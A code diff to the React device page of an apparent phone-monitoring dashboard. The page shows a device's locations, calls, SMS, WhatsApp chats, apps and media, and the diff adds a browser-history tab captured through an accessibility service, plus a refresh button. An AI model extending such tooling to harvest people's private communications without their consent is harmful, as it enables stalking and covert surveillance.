@@ -3,11 +3,11 @@ import { useParams, useNavigate } from 'react-router-dom'
 import { MapContainer, TileLayer, Marker, Popup, Polyline, useMap } from 'react-leaflet'
 import L from 'leaflet'
 import {
-  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps, getMusicHistory,
-  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto, MusicPlayDto
+  getLocations, getCallLogs, getSmsLogs, getWhatsApp, getWhatsAppChats, getInstalledApps, getMusicHistory, getBrowserHistory,
+  LocationDto, CallLogDto, SmsDto, WhatsAppDto, WhatsAppChatDto, InstalledAppDto, MusicPlayDto, BrowserHistoryDto
 } from '../api/api'
 
-type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps' | 'media'
+type Tab = 'map' | 'calls' | 'sms' | 'wa_notifs' | 'wa_chats' | 'apps' | 'media' | 'browser'
 
 const iconSelected = L.divIcon({
   className: '',
@@ -67,6 +67,7 @@ const TABS: { key: Tab; label: string }[] = [
   { key: 'wa_chats',  label: '\u{1F4AC} WA Chats' },
   { key: 'apps',      label: '\u{1F4E6} Apps' },
   { key: 'media',     label: '\u{1F3B5} Medias' },
+  { key: 'browser',   label: '\u{1F310} Browser' },
 ]
 
 export default function DevicePage() {
@@ -83,19 +84,27 @@ export default function DevicePage() {
   const [waChats,     setWaChats]     = useState<WhatsAppChatDto[]>([])
   const [apps,        setApps]        = useState<InstalledAppDto[]>([])
   const [music,       setMusic]       = useState<MusicPlayDto[]>([])
+  const [browser,     setBrowser]     = useState<BrowserHistoryDto[]>([])
+  const [refreshing,  setRefreshing]  = useState(false)
   const [appSearch,   setAppSearch]   = useState('')
   const [activeChat,  setActiveChat]  = useState<string | null>(null)
   const msgEndRef = useRef<HTMLDivElement>(null)
 
-  useEffect(() => {
-    getLocations(deviceId).then(r => setLocations(r.data)).catch(() => {})
-    getCallLogs(deviceId).then(r => setCalls(r.data)).catch(() => {})
-    getSmsLogs(deviceId).then(r => setSms(r.data)).catch(() => {})
-    getWhatsApp(deviceId).then(r => setWhatsapp(r.data)).catch(() => {})
-    getWhatsAppChats(deviceId).then(r => setWaChats(r.data)).catch(() => {})
-    getInstalledApps(deviceId).then(r => setApps(r.data)).catch(() => {})
-    getMusicHistory(deviceId).then(r => setMusic(r.data)).catch(() => {})
-  }, [deviceId])
+  useEffect(() => { loadData() }, [deviceId])
+
+  const loadData = () => {
+    setRefreshing(true)
+    Promise.all([
+      getLocations(deviceId).then(r => setLocations(r.data)),
+      getCallLogs(deviceId).then(r => setCalls(r.data)),
+      getSmsLogs(deviceId).then(r => setSms(r.data)),
+      getWhatsApp(deviceId).then(r => setWhatsapp(r.data)),
+      getWhatsAppChats(deviceId).then(r => setWaChats(r.data)),
+      getInstalledApps(deviceId).then(r => setApps(r.data)),
+      getMusicHistory(deviceId).then(r => setMusic(r.data)),
+      getBrowserHistory(deviceId).then(r => setBrowser(r.data)),
+    ]).catch(() => {}).finally(() => setRefreshing(false))
+  }
 
   // Auto-scroll to bottom when active chat messages change
   useEffect(() => {
@@ -150,6 +159,14 @@ export default function DevicePage() {
           &larr; Devices
         </button>
         <h1 className="text-lg font-bold text-gray-900">Device #{deviceId}</h1>
+        <button
+          onClick={loadData}
+          disabled={refreshing}
+          className="ml-auto px-3 py-1.5 bg-white border border-gray-200 hover:border-indigo-300 text-gray-600 hover:text-indigo-600 text-sm font-semibold rounded-lg transition-colors disabled:opacity-50"
+          title="Refresh"
+        >
+          {refreshing ? '⏳' : '🔄'}
+        </button>
       </header>
 
       <main className={`flex-1 flex flex-col overflow-hidden ${tab === 'wa_chats' || tab === 'map' ? 'p-2 md:p-4' : 'p-3 md:p-6 overflow-y-auto'}`}>
@@ -625,6 +642,73 @@ export default function DevicePage() {
               </table>
             </div>
 
+          </div>
+        )}
+
+        {/* ─── BROWSER HISTORY ─────────────────────────────── */}
+        {tab === 'browser' && (
+          <div className="flex flex-col gap-3">
+            <div className="flex items-center justify-between">
+              <span className="text-xs text-gray-500">{browser.length} visit{browser.length !== 1 ? 's' : ''} recorded</span>
+            </div>
+
+            <div className="bg-white rounded-xl shadow-sm overflow-hidden">
+              {/* Mobile */}
+              <div className="md:hidden divide-y divide-gray-100">
+                {browser.length === 0 && <p className="px-4 py-8 text-center text-gray-400 text-sm">No browser history yet. Enable the Browser accessibility service on the device.</p>}
+                {browser.map((b, i) => (
+                  <div key={i} className="flex items-start gap-3 px-4 py-3">
+                    {b.iconBase64
+                      ? <img src={`data:image/png;base64,${b.iconBase64}`} alt="" className="w-8 h-8 rounded-lg object-contain p-0.5 flex-shrink-0 mt-0.5" />
+                      : <div className="w-8 h-8 rounded-lg bg-blue-50 flex items-center justify-center text-base flex-shrink-0 mt-0.5">🌐</div>
+                    }
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center justify-between gap-2">
+                        <p className="text-sm font-semibold text-gray-800 truncate">{b.title || b.url}</p>
+                        <p className="text-xs text-gray-400 flex-shrink-0">{fmt(b.timestamp)}</p>
+                      </div>
+                      <p className="text-xs text-blue-600 truncate mt-0.5">{b.url}</p>
+                      <p className="text-xs text-gray-400 mt-0.5">{b.browser}</p>
+                    </div>
+                  </div>
+                ))}
+              </div>
+
+              {/* Desktop */}
+              <div className="hidden md:block overflow-x-auto">
+                <table className="w-full border-collapse">
+                  <thead>
+                    <tr><TH>Browser</TH><TH>Title / Domain</TH><TH>URL</TH><TH>Time</TH></tr>
+                  </thead>
+                  <tbody>
+                    {browser.map((b, i) => (
+                      <tr key={i} className="hover:bg-gray-50">
+                        <TD>
+                          <span className="inline-flex items-center gap-1.5">
+                            {b.iconBase64
+                              ? <img src={`data:image/png;base64,${b.iconBase64}`} alt="" className="w-5 h-5 rounded object-contain flex-shrink-0" />
+                              : <span className="text-base">🌐</span>
+                            }
+                            <span className="text-xs text-gray-600">{b.browser}</span>
+                          </span>
+                        </TD>
+                        <TD className="font-medium">{b.title || '—'}</TD>
+                        <TD>
+                          <a href={b.url} target="_blank" rel="noopener noreferrer"
+                             className="text-blue-600 hover:underline text-xs font-mono break-all">
+                            {b.url.length > 80 ? b.url.slice(0, 80) + '…' : b.url}
+                          </a>
+                        </TD>
+                        <TD>{fmt(b.timestamp)}</TD>
+                      </tr>
+                    ))}
+                    {browser.length === 0 && (
+                      <tr><td colSpan={4} className="px-4 py-8 text-center text-gray-400 text-sm">No browser history yet.</td></tr>
+                    )}
+                  </tbody>
+                </table>
+              </div>
+            </div>
           </div>
         )}
       </main>
